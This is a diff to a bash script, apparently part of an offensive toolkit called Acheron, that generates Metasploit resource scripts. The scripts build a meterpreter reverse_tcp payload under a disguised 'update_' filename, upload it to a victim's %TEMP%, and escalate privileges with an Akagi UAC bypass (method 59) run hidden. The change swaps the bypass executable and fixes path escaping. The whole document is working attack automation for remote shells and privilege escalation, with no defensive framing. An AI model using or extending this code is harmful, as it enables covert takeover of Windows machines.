@@ -1,5 +1,5 @@
 #!/bin/bash
-# Listener Generator - Generates msfconsole resource script with UAC bypass
+# Listener Generator - Generates msfconsole resource script with UAC bypass via Akagi
 # Portable, no hardcoded paths
 
 set -euo pipefail
@@ -13,22 +13,22 @@ PORT="$1"; LHOST="$2"
 OUTFILE="/tmp/acheron_listener_${PORT}.rc"
 BYPASS_RC="/tmp/bypassuac.rc"
 
-# Generate dynamic bypass UAC script with LHOST/LPORT
+# Generate dynamic bypass UAC script with LHOST/LPORT - FIX #3: Use akagi.exe not uacbypass.exe
 # Generate random payload name at generation time
 PAYLOAD_NAME="update_$(date +%s)_$(shuf -i 1000-9999 -n 1).exe"
 
 cat > "/tmp/bypassuac.rc" << BYPASS_EOF
-# UAC Bypass Method 59 - Debug Object / PPID Spoofing
+# UAC Bypass Method 59 - Debug Object / PPID Spoofing (Akagi)
 # Run MANUALLY in meterpreter: resource /tmp/bypassuac.rc
 
 # Generate new Acheron payload with same LHOST/LPORT
 run generate -f exe -o /tmp/\$PAYLOAD_NAME -p windows/x64/meterpreter/reverse_tcp -o LHOST=$LHOST -o LPORT=$PORT
 
 # Upload to victim %TEMP%
-upload /tmp/\$PAYLOAD_NAME %TEMP%\\\\\$PAYLOAD_NAME
+upload /tmp/\$PAYLOAD_NAME %TEMP%\\\\\\$PAYLOAD_NAME
 
-# Execute UAC bypass executable with our payload
-execute -f C:\\Windows\\Temp\\uacbypass.exe -a "%TEMP%\\\\$PAYLOAD_NAME" -H -i
+# Execute UAC bypass using Akagi Method 59
+execute -f C:\\\\Windows\\\\Temp\\\\akagi.exe -a "59 %TEMP%\\\\\\$PAYLOAD_NAME" -H -i
 
 # Clean up
 rm /tmp/\$PAYLOAD_NAME
@@ -55,6 +55,6 @@ ALIAS_EOF
 
 # Removed alias script generation - user will run bypassuac manually
 echo "[*] Run: msfconsole -r $OUTFILE" >&2
-echo "[*] UAC bypass manuale: in meterpreter digita 'bypassuac' (esegue /tmp/bypassuac.rc)" >&2
+echo "[*] UAC bypass manuale: in meterpreter digita 'bypassuac' (esegue /tmp/bypassuac.rc con akagi.exe 59)" >&2
 # Output ONLY the file path to stdout (for capture)
 echo "$OUTFILE"
